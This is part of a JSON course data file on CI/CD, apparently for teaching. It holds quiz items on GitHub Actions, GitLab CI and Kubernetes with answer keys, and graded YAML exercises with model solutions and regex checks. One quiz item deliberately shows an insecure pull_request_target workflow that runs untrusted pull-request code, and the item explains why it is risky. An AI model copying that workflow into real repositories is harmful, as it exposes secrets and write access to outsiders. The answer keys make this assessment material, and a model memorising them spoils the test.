+      "code": "on: pull_request_target\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v7\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n          allow-unsafe-pr-checkout: true\n      - run: npm ci && npm test",
+      "options": [
+        "pull_request_target runs on a merge commit in an isolated environment, so checking out PR code is safe.",
+        "The risk is limited to npm ci install scripts; npm test is safe.",
+        "Untrusted PR code runs in the default-branch context and may have access to secrets and write permissions.",
+        "The workflow runs more slowly because it checks out two repositories."
+      ],
+      "answer": 2,
+      "explain": "pull_request_target runs in the target repository's default-branch context and may have secrets or write permissions. Checking out and running untrusted pull-request code there can let an outsider execute code with those privileges. Use pull_request for build and test; reserve pull_request_target for trusted tasks such as labeling that do not run PR code."
+    },
+    {
+      "prompt": "A GitLab pipeline has unit and lint jobs in the test stage. Unit fails while lint is still running. What happens?",
+      "code": "stages: [build, test, deploy]\ncompile:\n  stage: build\n  script: npm run build\nunit:\n  stage: test\n  script: npm test\nlint:\n  stage: test\n  script: npm run lint\nrelease:\n  stage: deploy\n  script: ./release.sh",
+      "options": [
+        "Lint is canceled immediately, and the release stage continues.",
+        "Unit and lint run sequentially in file order, so this cannot happen.",
+        "The failure immediately cancels every running job in every stage.",
+        "Lint continues, the pipeline fails, and the next stage does not start."
+      ],
+      "answer": 3,
+      "explain": "Jobs in the same GitLab stage run in parallel. A failed unit job fails the pipeline, but does not immediately stop another job already running in that stage. The next stage, including release, does not start."
+    },
+    {
+      "prompt": "In GitLab, lint takes 20 seconds but waits eight minutes for the build stage to finish. How can it start as soon as the pipeline is created?",
+      "code": "stages: [build, test]\ncompile:\n  stage: build\n  script: npm run build\nlint:\n  stage: test\n  script: npm run lint",
+      "options": [
+        "Add needs: [] to lint so it starts when the pipeline is created.",
+        "Move lint to .post so it runs independently of the build stage.",
+        "Set when: always so lint starts before the build finishes.",
+        "Add needs: [compile] to make GitLab schedule lint sooner."
+      ],
+      "answer": 0,
+      "explain": "needs: [] lets lint start as soon as the pipeline is created, bypassing the normal stage order. needs: [compile] would still wait for compile. when: always controls whether a job runs after failures; it does not bypass stage ordering."
+    },
+    {
+      "prompt": "A GitLab branch with an open merge request gets both a branch pipeline and a merge-request pipeline after every push. What is the best way to avoid duplicate pipelines?",
+      "code": "build:\n  script: npm run build\n  rules:\n    - if: $SKIP_BUILD == \"true\"\n      when: never\n    - when: always",
+      "options": [
+        "Set interruptible: true so GitLab cancels the duplicate pipeline automatically.",
+        "Use workflow:rules to allow only the intended pipeline types, such as merge requests and the default branch.",
+        "Make the final rule when: manual so users choose a pipeline.",
+        "Move when: always before when: never so it is evaluated first."
+      ],
+      "answer": 1,
+      "explain": "The final when: always rule matches both the branch pipeline and the merge-request pipeline. Use workflow:rules to control which pipeline types GitLab creates, or make job rules specific enough to prevent duplicates. Rules are evaluated in order, so moving when: always earlier would make it match even more cases."
+    },
+    {
+      "prompt": "Two GitLab pipelines deploy to production at the same time and mix files on the server. How can the team serialize deploy jobs without canceling a running deployment?",
+      "code": "deploy-production:\n  stage: deploy\n  script:\n    - ./deploy.sh\n  rules:\n    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH",
+      "options": [
+        "Set resource_group: production on deploy so later jobs wait for the current one.",
+        "Set needs: [] so the new pipeline queues behind the old one.",
+        "Set interruptible: true so the new pipeline cancels the running deployment.",
+        "Set retry: 2 so overlapping deployments rerun automatically."
+      ],
+      "answer": 0,
+      "explain": "resource_group: production serializes deploy jobs across pipelines, so the later job waits for the current deployment to finish. needs orders jobs only within one pipeline. interruptible could cancel the running deployment, while retry does not prevent two deployments from overlapping."
+    },
+    {
+      "prompt": "A GitLab deploy job on a feature branch cannot read the protected PROD_DEPLOY_KEY variable, although the name is correct. Why?",
+      "options": [
+        "Masked variables always appear blank in logs, so the job cannot read them.",
+        "Protected variables must use the File type to be available in a script.",
+        "Protected variables are available only to pipelines on protected branches or tags, not feature branches.",
+        "A maintainer must approve every use of a variable."
+      ],
+      "answer": 2,
+      "explain": "Protected GitLab variables are available only to pipelines on protected branches or protected tags. A feature branch does not qualify, so the production key is unavailable there. Masking hides a value in logs; it does not determine whether a job can access the variable."
+    },
+    {
+      "prompt": "A Deployment has four replicas, and the team wants all four Pods to remain available during a rolling update while temporarily using extra capacity. How should the strategy be configured?",
+      "code": "spec:\n  replicas: 4\n  strategy:\n    type: RollingUpdate",
+      "options": [
+        "Set maxSurge: 0 and maxUnavailable: 0 to prevent any Pod count changes.",
+        "Use Recreate so new Pods start before all old Pods are removed.",
+        "Keep the default: 25% of four rounds down to zero unavailable Pods.",
+        "Set maxUnavailable: 0 and maxSurge: 1 so a new Pod can become ready before an old one is removed."
+      ],
+      "answer": 3,
+      "explain": "With four desired replicas, maxUnavailable: 0 keeps all four available, while maxSurge: 1 allows one extra Pod to start and become ready before an old one is removed. Both values cannot be zero. The default 25% maxUnavailable rounds down to one Pod, allowing availability to drop to three."
+    },
+    {
+      "prompt": "New API Pods take about 30 seconds to become ready, but the Service sends traffic as soon as the container starts, causing brief 502 errors. What should the team add first?",
+      "options": [
+        "Add a readinessProbe so the Service sends traffic only to ready Pods.",
+        "Add a livenessProbe so Kubernetes sends traffic only after liveness passes.",
+        "Add sleep 30 to the CI pipeline before deployment.",
+        "Double the replicas because the 502s mean the old Pods cannot handle the traffic."
+      ],
+      "answer": 0,
+      "explain": "A readiness probe keeps a Pod out of Service traffic until it is ready to handle requests, and the rollout waits for replacement Pods to become ready before scaling down old ones. A liveness probe decides when to restart a container; it does not gate traffic. A fixed sleep in CI does not reflect Pod readiness."
+    },
+    {
+      "prompt": "A GitOps agent restores the original replica count minutes after engineers run kubectl scale during an incident. What is the likely cause?",
+      "options": [
+        "The Kubernetes Deployment controller always reverts manual kubectl changes.",
+        "The agent reconciles actual state to the value in Git, reverting the manual change.",
+        "kubectl scale retriggers CI, which restores the old value.",
+        "kubectl scale is temporary and expires after a few minutes."
+      ],
+      "answer": 1,
+      "explain": "GitOps continuously compares actual cluster state with the desired state stored in Git and reconciles differences. A manual kubectl scale is drift, so the agent restores the replica count from Git. To make the change persist, update the desired state in Git through a commit or pull request; kubectl scale does not expire on its own."
+    }
+  ],
+  "exercises": [
+    {
+      "title": "Create a GitHub Actions CI workflow",
+      "level": "กลาง",
+      "tags": "workflow · permissions · cache · hierarchy",
+      "lang": "yaml",
+      "prompt": "Write .github/workflows/ci.yml for the existing Node.js project. Run it on pushes to main and pull requests targeting main. Grant GITHUB_TOKEN read-only repository access. Check out the code, set up Node.js 24 with the npm cache, then run npm ci, npm run lint, and npm test in separate steps. Use actions/checkout@v7 and actions/setup-node@v7.",
+      "context": "The repository is a Node.js project that already has package-lock.json and the lint and test scripts in package.json. The team wants every PR to be published within minutes and doesn't give workflow unnecessary permissions to write to the repository.",
+      "starter": "name: CI\n\n# เขียน workflow ต่อที่นี่\n",
+      "solution": "name: CI\n\non:\n  push:\n    branches: [main]\n  pull_request:\n    branches: [main]\n\npermissions:\n  contents: read\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v7\n      - uses: actions/setup-node@v7\n        with:\n          node-version: 24\n          cache: npm\n      - run: npm ci\n      - run: npm run lint\n      - run: npm test\n",
+      "hints": [
+        "A workflow has three main top-level sections: on (trigger events), permissions (token access), and jobs (work to run).",
+        "Set runs-on: ubuntu-latest for the job. The first step should use actions/checkout@v7, and permissions should include contents: read.",
+        "Configure actions/setup-node@v7 with node-version: 24 and cache: npm. Add separate run steps for npm ci, npm run lint, and npm test."
+      ],
+      "checks": [
+        {
+          "label": "trigger when push and pull_request into main",
+          "pattern": "^(?=[\\s\\S]*\\bpush:(?:[ \\t]*\\{[ \\t]*|[ \\t]*\\r?\\n([ \\t]+)(?:[^\\n]*\\n\\1)*?)branches:[ \\t]*(?:\\[[^\\]]*\\bmain\\b|\\r?\\n[ \\t]*-[ \\t]*['\"]?main\\b|['\"]?main\\b))(?=[\\s\\S]*\\bpull_request:(?:[ \\t]*\\{[ \\t]*|[ \\t]*\\r?\\n([ \\t]+)(?:[^\\n]*\\n\\2)*?)branches:[ \\t]*(?:\\[[^\\]]*\\bmain\\b|\\r?\\n[ \\t]*-[ \\t]*['\"]?main\\b|['\"]?main\\b))"
+        },
+        {
+          "label": "Restrict GITHUB_TOKEN permissions to contents: read and do not grant write permissions.",
+          "pattern": "^(?![\\s\\S]*(?:^|[,{])[ \\t]*(?:permissions|actions|attestations|checks|contents|deployments|discussions|id-token|issues|models|packages|pages|pull-requests|security-events|statuses):[ \\t]*['\"]?write(?:-all)?\\b)[\\s\\S]*?(?:permissions:[ \\t]*['\"]?read-all|permissions:[\\s\\S]*?contents:[ \\t]*['\"]?read)"
+        },
+        {
+          "label": "There are jobs and runs-on.",
+          "pattern": "jobs:[\\s\\S]*runs-on:"
+        },
+        {
+          "label": "checkout code",
+          "pattern": "uses:\\s*['\"]?actions\\/checkout@"
+        },
+        {
+          "label": "Use setup-node with Node 24",
+          "pattern": "uses:\\s*['\"]?actions\\/setup-node@[\\s\\S]*node-version:\\s*['\"]?24"
+        },
+        {
+          "label": "npm's cache",
+          "pattern": "cache:\\s*['\"]?npm"
+        },
+        {
+          "label": "npm sequence ci → lint → test",
+          "pattern": "npm ci[\\s\\S]*npm run lint[\\s\\S]*npm (run )?test"
+        }
+      ]
+    },
+    {
+      "title": "Write .gitlab-ci.yml with fast lint and safe deploy rules",
+      "level": "ง่าย",
+      "tags": "GitLab CI · stages · needs · artifacts · rules",
+      "lang": "yaml",
+      "prompt": "Write .gitlab-ci.yml for the Node.js project using image node:24 and stages test, build, deploy. Define four jobs: lint (test stage) starts immediately, runs npm ci and npm run lint; unit-test (test stage) runs npm ci and npm test; build (build stage) runs npm ci and npm run build, and saves dist/ as an artifact that expires in one week; deploy (deploy stage) runs ./deploy.sh only in a pipeline for the default branch. Use rules, not only/except.",
+      "context": "The team moved to GitLab. The project already had package-lock.json and lint, test, build scripts in package.json. The team wanted lint to respond as quickly as possible and was prohibited from deploying from the feature branch.",
+      "starter": "# .gitlab-ci.yml\nimage: node:24\n\n# กำหนด stages และ jobs ต่อที่นี่\n",
+      "solution": "image: node:24\n\nstages:\n  - test\n  - build\n  - deploy\n\nlint:\n  stage: test\n  needs: []\n  script:\n    - npm ci\n    - npm run lint\n\nunit-test:\n  stage: test\n  script:\n    - npm ci\n    - npm test\n\nbuild:\n  stage: build\n  script:\n    - npm ci\n    - npm run build\n  artifacts:\n    paths:\n      - dist/\n    expire_in: 1 week\n\ndeploy:\n  stage: deploy\n  script:\n    - ./deploy.sh\n  rules:\n    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH\n",
+      "hints": [
+        "Use top-level image and stages, followed by job definitions. A job without a stage defaults to test.",
+        "Set needs: [] for lint so it starts immediately. Define artifact paths and expire_in. Use rules: with an - if: condition to control when deploy runs.",
+        "Use $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH for the deploy rule and expire_in: 1 week for the build artifact."
+      ],
+      "checks": [
+        {
+          "label": "Use image node:24",
+          "pattern": "image:[\\s\\S]{0,40}node:24"
+        },
+        {
+          "label": "stages sort test → build → deploy",
+          "pattern": "^stages:\\s*(\\[[^\\]]*\\btest\\b[^\\]]*\\bbuild\\b[^\\]]*\\bdeploy\\b|[\\s\\S]*?-\\s*['\"]?test['\"]?\\s*\\n[\\s\\S]*?-\\s*['\"]?build['\"]?\\s*\\n[\\s\\S]*?-\\s*['\"]?deploy\\b)"
+        },
+        {
+          "label": "lint starts now with needs: []",
+          "pattern": "^lint:[ \\t]*\\r?\\n(?:[ \\t]+[^\\n]*\\n|[ \\t]*\\r?\\n)*?[ \\t]+needs:[ \\t]*\\[\\s*\\]"
+        },
+        {
+          "label": "build stores dist/ as artifacts and expires in 1 week.",
+          "pattern": "^(?=[\\s\\S]*artifacts:[\\s\\S]*?paths:[\\s\\S]*?dist)(?=[\\s\\S]*expire_in:[ \\t]*['\"]?(?:1[ \\t]*(?:week|w)s?|7[ \\t]*(?:days?|d))\\b)"
+        },
+        {
+          "label": "deploy uses rules only for default branch",
+          "pattern": "^deploy:[ \\t]*\\r?\\n(?:[ \\t]+[^\\n]*\\n|[ \\t]*\\r?\\n)*?[ \\t]+rules:[ \\t]*\\r?\\n(?:[ \\t]+[^\\n]*\\n)*?[ \\t]+-?[ \\t]*if:[ \\t]*['\"]?\\$ci_(?:commit_(?:branch|ref_name)['\"]?[ \\t]*==[ \\t]*['\"]?\\$ci_default_branch|default_branch['\"]?[ \\t]*==[ \\t]*['\"]?\\$ci_commit_(?:branch|ref_name))"
+        },
+        {
+          "label": "Complete script: npm ci, lint, test, build and ./deploy.sh",
+          "pattern": "^(?=[\\s\\S]*npm ci)(?=[\\s\\S]*npm run lint)(?=[\\s\\S]*npm (?:run )?test)(?=[\\s\\S]*npm run build)(?=[\\s\\S]*deploy\\.sh)"
+        },
+        {
+          "label": "Don't use only/except the old way.",
+          "pattern": "^\\s*(only|except):",
+          "negate": true
+        }
+      ]
+    },
+    {
+      "title": "Pass outputs and artifacts between jobs and serialize deployments",
+      "level": "ยาก",
+      "tags": "needs · job outputs · artifacts · environment · concurrency",
+      "lang": "yaml",
+      "prompt": "Edit .github/workflows/deploy.yml while keeping the job names build and deploy. (1) In build, write the first seven characters of the commit SHA to $GITHUB_OUTPUT in a step with an id, then expose it as the job output version. (2) Upload dist/ as an artifact named dist with actions/upload-artifact@v7. (3) Make deploy depend on build, target the production environment, download dist with actions/download-artifact@v8 into the dist directory, and run ./deploy.sh dist \"$VERSION\", where VERSION comes from the build output through the step environment. (4) Use the deploy-production concurrency group to prevent overlapping deployments without canceling the deployment already in progress.",
+      "context": "Now build and deploy run in parallel. ./deploy.sh can't find the dist folder because it's in a different runner. And if there are two pushes next to each other, the two rounds of deploy production may run overlapping. Keep the job names the same: build and deploy.",
+      "starter": "name: Deploy\n\non:\n  push:\n    branches: [main]\n\npermissions:\n  contents: read\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v7\n      - uses: actions/setup-node@v7\n        with:\n          node-version: 24\n          cache: npm\n      - run: npm ci\n      - run: npm run build\n\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v7\n      - run: ./deploy.sh dist\n",
+      "solution": "name: Deploy\n\non:\n  push:\n    branches: [main]\n\npermissions:\n  contents: read\n\nconcurrency:\n  group: deploy-production\n  cancel-in-progress: false\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    outputs:\n      version: ${{ steps.ver.outputs.version }}\n    steps:\n      - uses: actions/checkout@v7\n      - uses: actions/setup-node@v7\n        with:\n          node-version: 24\n          cache: npm\n      - run: npm ci\n      - run: npm run build\n      - id: ver\n        run: echo \"version=${GITHUB_SHA::7}\" >> \"$GITHUB_OUTPUT\"\n      - uses: actions/upload-artifact@v7\n        with:\n          name: dist\n          path: dist/\n\n  deploy:\n    needs: build\n    runs-on: ubuntu-latest\n    environment: production\n    steps:\n      - uses: actions/checkout@v7\n      - uses: actions/download-artifact@v8\n        with:\n          name: dist\n          path: dist\n      - env:\n          VERSION: ${{ needs.build.outputs.version }}\n        run: ./deploy.sh dist \"$VERSION\"\n",
+      "hints": [
+        "Think in three parts: pass text between jobs with outputs and needs, pass files with artifacts, and control deployments with environment and concurrency.",
+        "The step that writes name=value to \"$GITHUB_OUTPUT\" needs an id. Map it at the job level with outputs: version: ${{ steps.<id>.outputs.version }}, then read it with needs.build.outputs.version in the next job (for example, through a step env variable).",
+        "Use the same artifact name, dist, for upload and download. Set needs: build and environment: production on deploy. Set concurrency.group: deploy-production and cancel-in-progress: false."
+      ],
+      "checks": [
+        {
+          "label": "deploy, wait for build and read output version",
+          "pattern": "^(?=[\\s\\S]*?^([ \\t]+)deploy:[ \\t]*\\r?\\n(?:\\1[ \\t]+[^\\n]*\\n|[ \\t]*\\r?\\n)*?\\1[ \\t]+needs:[ \\t]*(?:\\[[ \\t]*|\\r?\\n[ \\t]*-[ \\t]*)?['\"]?build['\"]?)(?=[\\s\\S]*needs\\.build\\.outputs\\.version)"
+        },
+        {
+          "label": "build declares output version from step with id",
+          "pattern": "^(?=[\\s\\S]*?outputs:[\\s\\S]{0,80}?version:[ \\t]*['\"]?\\$\\{\\{[ \\t]*steps\\.([\\w-]+)\\.outputs\\.version)(?=[\\s\\S]*\\bid:[ \\t]*['\"]?\\1['\"]?[ \\t]*(?:\\r?\\n|$))"
+        },
+        {
+          "label": "Write version (7 characters) into GITHUB_OUTPUT",
+          "pattern": "^(?=[\\s\\S]*version=)(?=[\\s\\S]*>>?[ \\t]*['\"]?\\$\\{?github_output)(?=[\\s\\S]*(?:::7|:0:7|cut\\s+-c\\s*1?-7|head\\s+-c\\s*7|--short=7))"
+        },
+        {
+          "label": "upload and download artifact named dist into dist folder",
+          "pattern": "^(?=[\\s\\S]*upload-artifact@(?:v[4-9]|v\\d{2,}|[0-9a-f]{40})\\b(?:(?!\\n[ \\t]*-[ \\t])[\\s\\S]){0,200}?(?:name:[ \\t]*['\"]?dist['\"]?\\b(?:(?!\\n[ \\t]*-[ \\t])[\\s\\S]){0,200}?path:[ \\t]*['\"]?(?:\\./)?dist\\b|path:[ \\t]*['\"]?(?:\\./)?dist\\b(?:(?!\\n[ \\t]*-[ \\t])[\\s\\S]){0,200}?name:[ \\t]*['\"]?dist['\"]?\\b))(?=[\\s\\S]*download-artifact@(?:v[4-9]|v\\d{2,}|[0-9a-f]{40})\\b(?:(?!\\n[ \\t]*-[ \\t])[\\s\\S]){0,200}?(?:name:[ \\t]*['\"]?dist['\"]?\\b(?:(?!\\n[ \\t]*-[ \\t])[\\s\\S]){0,200}?path:[ \\t]*['\"]?(?:\\./)?dist\\b|path:[ \\t]*['\"]?(?:\\./)?dist\\b(?:(?!\\n[ \\t]*-[ \\t])[\\s\\S]){0,200}?name:[ \\t]*['\"]?dist['\"]?\\b))"
+        },
+        {
+          "label": "job deploy uses production environment",
+          "pattern": "^([ \\t]+)deploy:[ \\t]*\\r?\\n(?:\\1[ \\t]+[^\\n]*\\n|[ \\t]*\\r?\\n)*?\\1[ \\t]+environment:[ \\t]*(?:['\"]?production\\b|\\r?\\n[ \\t]+name:[ \\t]*['\"]?production\\b|\\{[^}]*name:[ \\t]*['\"]?production\\b)"
+        },
+        {
+          "label": "concurrency group deploy-production and does not cancel the running round.",
+          "pattern": "^(?![\\s\\S]*cancel-in-progress:[ \\t]*['\"]?true)(?=[\\s\\S]*concurrency:(?:[ \\t]*['\"]?deploy-production\\b|[\\s\\S]*?group:[ \\t]*['\"]?deploy-production\\b))"
+        },
+        {
+          "label": "Run ./deploy.sh dist \"$VERSION\" getting the value from env.",
+          "pattern": "deploy\\.sh[ \\t]+['\"]?(?:\\./)?dist/?['\"]?[ \\t]+['\"]?\\$\\{?version\\}?['\"]?"
+        }
+      ]
+    }
+  ],
+  "refs": [
+    {
+      "title": "GitHub Actions: Workflow syntax",
+      "url": "https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax",
+      "note": "matrix, needs, outputs, concurrency, permissions and path-filter conditions"
+    },
+    {
+      "title": "GitHub Actions: Secure use reference",
+      "url": "https://docs.github.com/en/actions/reference/security/secure-use",
+      "note": "script injection, third-party actions, untrusted code checkout"
+    },
+    {
+      "title": "GitHub Actions: Events that trigger workflows",
+      "url": "https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows",
+      "note": "pull_request, pull_request_target, workflow_run and workflows from forks"
+    },
+    {
+      "title": "GitLab CI/CD YAML syntax reference",
+      "url": "https://docs.gitlab.com/ci/yaml/",
+      "note": "stages, needs, rules, artifacts, cache, workflow:rules"
+    },
+    {
+      "title": "Kubernetes: Deployments",
+      "url": "https://kubernetes.io/docs/concepts/workloads/controllers/deployment/",
+      "note": "RollingUpdate, rollout undo, revisionHistoryLimit"
+    },
+    {
+      "title": "OpenGitOps: GitOps Principles",
+      "url": "https://opengitops.dev/",
+      "note": "The four GitOps v1.0.0 principles"
+    },
+    {
+      "title": "DORA: DORA's software delivery performance metrics",
+      "url": "https://dora.dev/guides/dora-metrics/",
+      "note": "DORA Software Delivery Metrics"
+    },
+    {
+      "title": "Kubernetes: Liveness, readiness and startup probes",
+      "url": "https://kubernetes.io/docs/tasks/configure-pod-container/configure-liveness-readiness-startup-probes/",
+      "note": "readiness probe and receiving traffic through Service"
+    }
+  ]
+}
